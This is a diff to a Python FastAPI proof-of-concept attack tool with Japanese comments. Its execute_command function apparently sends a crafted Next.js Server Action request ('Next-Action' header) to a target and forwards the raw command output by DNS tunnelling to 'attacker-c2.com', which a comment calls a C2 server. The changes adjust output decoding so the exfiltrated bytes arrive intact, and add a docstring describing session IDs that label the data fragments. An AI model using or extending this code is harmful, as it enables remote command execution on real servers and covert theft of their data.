@@ -14,6 +14,11 @@ app = FastAPI(
 app_base_path = "/poc"
 
 def get_session_id():
+    """
+    ランダムなセッションIDを生成します。
+    これはデータの断片を識別するために使用されます。
+    例: 'a1b2c3d4'
+    """
     session_id = str(uuid.uuid4())[:8]
     return session_id
 
@@ -130,12 +135,13 @@ async def execute_command(body: dict):
     headers = {"Next-Action": "x"}  # Server Actionリクエストであることを示す。
     res = requests.post(base_url, files=files, headers=headers, timeout=10)
     print(res.status_code)
-    print(res.text)
+    decoded_result = res.content.decode('utf-8', errors='replace')
+    print(decoded_result) # res.textでは文字化けしてしまう。
 
     # C2サーバーに文字化けさせず転送するためにcontent（バイト列）を利用する。
     dns_tunneling(res.content, "attacker-c2.com")
 
     # 検証のために結果を返す。
     return {
-        "result": res.text,
+        "result": decoded_result,
     }
